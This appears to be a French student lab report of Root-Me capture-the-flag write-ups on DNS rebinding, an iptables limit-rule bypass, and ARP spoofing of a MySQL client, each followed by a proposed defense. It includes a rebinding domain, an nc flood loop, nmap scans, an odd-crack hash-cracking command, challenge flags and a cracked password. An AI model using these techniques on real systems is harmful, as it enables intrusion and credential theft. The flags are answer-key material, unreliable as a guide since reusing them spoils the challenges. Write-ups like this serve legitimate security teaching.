# I. DNS Rebinding


🌞 Write-up de l'épreuve
```
Après s'être informé sur les requètes DNS, TTL et avoir compris le code on sait que le flag se trouve à http://challenge01.root-me.org:54022/admin mais interdiction de le récupérer, sauf si la requête provient d’une IP liée à localhost.
Il est possible d'établir une valeur très basse du TTL, ce qui permet au client de renvoyer des requêtes DNS en permanence. De plus, nous pouvons ajuster le domaine pour qu'il se dirige vers une IP locale par exemple.
Pour modifier le nom de domaine j'ai utilé ce site https://lock.cmpxchg8b.com/rebinder.html trouvé sur un Git 

c0a80001.7f000001.rbndr.us

Flag : u1reSog00dWizDNSR3bindindon
```
🌞 Proposer une version du code qui n'est pas vulnérable

```
Pour corriger la vulnérabilité tout en maintenant les fonctionnalités existantes, voici une version améliorée du code. Les modifications principales se concentrent sur :

1- Validation stricte des noms de domaine et des IPs :
        Filtrage explicite des plages d'adresses internes pour éviter le rebinding.

2-Protection contre les redirections internes :
        Vérification de chaque redirection pour empêcher les accès à des ressources internes.

3-Validation supplémentaire avant chaque requête :
        Réalisation de contrôles avant et après chaque étape (validation de l'URL, résolution DNS, redirections).

```


# II. Netfilter erreurs courantes

🌞 Write-up de l'épreuve

```
Après analyse du code, on peut voir que le script iptables est mal configuré.

# apply some flood protection against remaining trafic
IP46T -A INPUT-HTTP -m limit --limit 3/sec --limit-burst 20 -j LOG --log-prefix 'FW_FLOODER '
IP46T -A INPUT-HTTP -m limit --limit 3/sec --limit-burst 20 -j DROP
```
```
tom@debian:~$ for i in {1..20}; do echo | nc challenge01.root-me.org 54017 & done ; curl -i http://challenge01.root-me.org:54017/ 
[1] 6817
[2] 6819
[3] 6821
[4] 6823
[5] 6825
[6] 6827
[7] 6829
[8] 6831
[9] 6833
[10] 6835
[11] 6837
[12] 6839
[13] 6841
[14] 6843
[15] 6845
[16] 6847
[17] 6849
[18] 6851
[19] 6853
[20] 6855
HTTP/1.1 200 OK
content-type: text/plain
connection: close
Date: Thu, 21 Nov 2024 14:06:29 GMT
Transfer-Encoding: chunked


Nicely done:)

There are probably a few things the administrator was missing when writing this ruleset:

    1) When a rule does not match, the next one is tested against

    2) When jumped in a user defined chain, if there is no match, then the
       search resumes at the next rule in the previous (calling) chain

    3) The 'limit' match is used to limit the rate at which a given rule can
       match: above this limit, 1) applies

    4) When a rule with a 'terminating' target (e.g.: ACCEPT, DROP...) matches
       a packet, then the search stops: the packet won't be tested against any
       other rules
    



The flag is: saperlipopete

```

🌞 Proposer un jeu de règles firewall
```
iptables -N HTTP_LIMIT
iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW -j HTTP_LIMIT
iptables -A HTTP_LIMIT -m limit --limit 3/sec --limit-burst 10 -j RETURN
iptables -A HTTP_LIMIT -j DROP
```


# III. ARP Spoofing Ecoute active
🌞 Write-up de l'épreuve


On fait un scan des réseaux pour connaitre les machines disponibles.

```
commande : nmap -sn -PR  172.18.0.0/16 --min-parallelism 10 -oN scan_result.txt

root@fac50de5d760:~# nmap -sn -PR  172.18.0.0/16 --min-parallelism 10 -oN scan_result.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-31 08:24 UTC
Stats: 0:00:09 elapsed; 0 hosts completed (0 up), 4096 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 80.19% done; ETC: 08:24 (0:00:02 remaining)
Nmap scan report for 172.18.0.1
Host is up (0.000025s latency).
MAC Address: 02:42:D2:E0:E2:A9 (Unknown)
Nmap scan report for db.arp-spoofing-dist-2_default (🌞172.18.0.2🌞)
Host is up (0.000040s latency).
MAC Address: 02:42:AC:12:00:02 (Unknown)
Nmap scan report for client.arp-spoofing-dist-2_default (🌞172.18.0.3🌞)
Host is up (0.000072s latency).
MAC Address: 02:42:AC:12:00:03 (Unknown)
Nmap scan report for fac50de5d760 (172.18.0.4)
Host is up.


```
Après avoir determiné les machines dans le réseau il faut trouver a quoi elle corresponde ( Client - Serveur database)
```
root@fac50de5d760:~# nmap -p- 172.18.0.3
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-31 08:33 UTC
Nmap scan report for 🌞client.arp-spoofing-dist-2_default🌞(172.18.0.3)
Host is up (0.000018s latency).
All 65535 scanned ports on client.arp-spoofing-dist-2_default (172.18.0.3) are closed
MAC Address: 02:42:AC:12:00:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.41 seconds


```
```
root@fac50de5d760:~# nmap -p- 172.18.0.2
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-31 08:35 UTC
Nmap scan report for 🌞db.arp-spoofing-dist-2_default🌞 (172.18.0.2)
Host is up (0.000036s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:AC:12:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.70 seconds

```
```
tom@debian:~$ odd-crack 'hex(sha1_raw($p)+sha1_raw($s.sha1_raw(sha1_raw($p))))' --salt hex:2d0b063e696a68582529680c402a21776f777862 Téléchargements/rockyou.txt 0907f80d40a6fa807c59dece79af83f7d988b141    
[*] loading file...
[*] found heyheyhey=0907f80d40a6fa807c59dece79af83f7d988b141
[*] all hashes found, shutdown requested
[*] done, tried 4700 passwords

l1tter4lly_4_c4ptur3_th3_fl4g:heyheyhey
```

🌞 Proposer une configuration pour empêcher votre attaque
```
Changer le type d'authenfication du mysql. 
```

[Wireshark🦈](tp6/spoof.pcap)



# IV. Bonus : Trafic Global System for Mobile communications

Lien vers l'épreuve root-me.


⭐ BONUS : Write-up de l'épreuve
